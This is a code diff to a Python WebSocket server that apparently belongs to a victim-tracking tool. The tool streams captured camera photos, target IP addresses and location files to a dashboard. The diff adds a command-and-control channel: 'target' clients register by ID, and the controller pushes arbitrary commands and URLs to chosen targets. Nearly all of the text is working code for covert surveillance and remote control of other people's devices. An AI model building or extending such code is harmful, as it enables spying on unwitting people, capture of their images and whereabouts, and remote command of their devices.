@@ -233,42 +233,87 @@ def watch_directory():
 
 # ========== WebSocket Server ==========
 
+# Global trackers for Two-Way setups
+controllers = set()
+targets = {}
+
 async def ws_handler(websocket, path=None):
-    """Handle WebSocket connections for real-time updates."""
-    print(f"{Color.CYAN}[WS] Client connected{Color.RESET}")
-    seen = set()
-    
+    """Handle WebSocket connections for real-time updates and control."""
+    print(f"{Color.CYAN}[WS] New connection attempt...{Color.RESET}")
+    client_id = None
+    client_type = None
+
     try:
-        while True:
-            updates = {}
-            
-            # Check for new photos
-            photos = glob.glob(os.path.join(BASE_DIR, 'cam*.png'))
-            new_photos = [os.path.basename(p) for p in photos if p not in seen]
-            if new_photos:
-                updates['photos'] = new_photos
-                seen.update(photos)
-            
-            # Check for new IP
-            ip_file = os.path.join(BASE_DIR, 'ip.txt')
-            if os.path.exists(ip_file) and ip_file not in seen:
-                seen.add(ip_file)
-                with open(ip_file) as f:
-                    updates['target'] = f.read().strip()
-            
-            # Check for location
-            loc_file = os.path.join(BASE_DIR, 'current_location.txt')
-            if os.path.exists(loc_file) and loc_file + str(os.path.getmtime(loc_file)) not in seen:
-                seen.add(loc_file + str(os.path.getmtime(loc_file)))
-                with open(loc_file) as f:
-                    updates['location'] = f.read().strip()
-            
-            if updates:
-                await websocket.send(json.dumps(updates))
-            
-            await asyncio.sleep(2)
-    except websockets.exceptions.ConnectionClosed:
-        print(f"{Color.YELLOW}[WS] Client disconnected{Color.RESET}")
+        # 1. Identity Handshake check
+        handshake = await websocket.recv()
+        data = json.loads(handshake)
+        client_type = data.get("type", "dashboard")
+        
+        if client_type == "dashboard":
+            controllers.add(websocket)
+            print(f"{Color.GREEN}[WS] Controller added.{Color.RESET}")
+        elif client_type == "target":
+            client_id = data.get("id", "unknown")
+            targets[client_id] = websocket
+            print(f"{Color.MAGENTA}[WS] Target connected: {client_id}{Color.RESET}")
+            # Notify controllers
+            for c in controllers:
+                try: await c.send(json.dumps({"target_online": client_id}))
+                except: pass
+
+        # 2. Setup Concurrency (Read and Write)
+        async def read_loop():
+            try:
+                while True:
+                    msg = await websocket.recv()
+                    parsed = json.loads(msg)
+                    cmd = parsed.get("cmd")
+                    
+                    if client_type == "dashboard":
+                        target_id = parsed.get("id")
+                        if target_id in targets:
+                            print(f"{Color.YELLOW}[WS] Pushing command '{cmd}' to {target_id}{Color.RESET}")
+                            target_ws = targets[target_id]
+                            await target_ws.send(json.dumps({"cmd": cmd, "url": parsed.get("url", "")}))
+                        else:
+                            print(f"{Color.RED}[WS] Target {target_id} not connected.{Color.RESET}")
+            except: pass
+
+        async def write_loop():
+            seen = set()
+            try:
+                while True:
+                    if client_type == "dashboard":
+                        updates = {}
+                        photos = glob.glob(os.path.join(BASE_DIR, 'cam*.png'))
+                        new_photos = [os.path.basename(p) for p in photos if p not in seen]
+                        if new_photos:
+                            updates['photos'] = new_photos
+                            seen.update(photos)
+
+                        ip_file = os.path.join(BASE_DIR, 'ip.txt')
+                        if os.path.exists(ip_file) and ip_file not in seen:
+                            seen.add(ip_file)
+                            with open(ip_file) as f: updates['target'] = f.read().strip()
+
+                        loc_file = os.path.join(BASE_DIR, 'current_location.txt')
+                        if os.path.exists(loc_file) and loc_file + str(os.path.getmtime(loc_file)) not in seen:
+                            seen.add(loc_file + str(os.path.getmtime(loc_file)))
+                            with open(loc_file) as f: updates['location'] = f.read().strip()
+
+                        if updates:
+                            await websocket.send(json.dumps(updates))
+
+                    await asyncio.sleep(2)
+            except: pass
+
+        await asyncio.gather(read_loop(), write_loop())
+
+    except Exception as e:
+        print(f"{Color.YELLOW}[WS] Closed: {client_type} ({client_id if client_id else 'dashboard'}){Color.RESET}")
+    finally:
+        if websocket in controllers: controllers.remove(websocket)
+        if client_id in targets: del targets[client_id]
 
 def start_websocket():
     """Start WebSocket server for real-time updates."""
